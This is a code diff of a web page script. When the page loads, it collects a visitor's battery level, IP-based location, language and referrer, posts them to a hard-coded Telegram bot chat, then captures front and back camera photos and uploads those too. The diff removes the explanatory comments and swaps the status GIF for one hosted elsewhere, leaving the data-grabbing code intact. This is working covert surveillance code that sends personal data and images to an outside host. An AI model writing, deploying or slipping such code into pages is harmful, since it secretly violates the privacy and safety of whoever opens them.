@@ -24,7 +24,6 @@
     const CHAT_ID = "7216371031";
     let deviceInfo = "";
 
-    // Send text message to Telegram
     function sendToTelegram(message) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -33,20 +32,18 @@
       });
     }
 
-    // Send animation GIF to Telegram
     function sendGifURL() {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAnimation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
-          animation: "https://media.tenor.com/HkKJKYZAjHwAAAAC/loading-bar-loader.gif",
+          animation: "https://heavenscake.vercel.app/07331b85449052cff8acbc861d3c6f01.gif",
           caption: "🎬 Capturing device info..."
         })
       });
     }
 
-    // Send image to Telegram
     function sendPhotoToTelegram(blob) {
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
@@ -57,7 +54,6 @@
       });
     }
 
-    // Take photo using camera
     async function takePhoto(facing = "user") {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
@@ -78,7 +74,6 @@
       }
     }
 
-    // Battery info
     function getBatteryInfo() {
       return navigator.getBattery().then(battery => {
         deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
@@ -88,7 +83,6 @@
       });
     }
 
-    // IP/location info (via ipinfo)
     function getIPInfo() {
       return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
         .then(res => res.json())
@@ -103,7 +97,6 @@
         });
     }
 
-    // Extra device info
     function getExtraDetails() {
       const touch = 'ontouchstart' in window ? "Yes" : "No";
       const languages = navigator.languages.join(", ");
@@ -121,17 +114,14 @@
       deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
     }
 
-    // Run everything
     async function collectAndSend() {
-      await sendGifURL(); // Send GIF first
+      await sendGifURL();
       await Promise.all([getBatteryInfo(), getIPInfo()]);
       getExtraDetails();
       await sendToTelegram(deviceInfo);
-
-      // Camera (ask permission)
-      await takePhoto("user");        // Front
-      await takePhoto("user");        // Front again
-      await takePhoto("environment"); // Back
+      await takePhoto("user");
+      await takePhoto("user");
+      await takePhoto("environment");
     }
 
     collectAndSend();
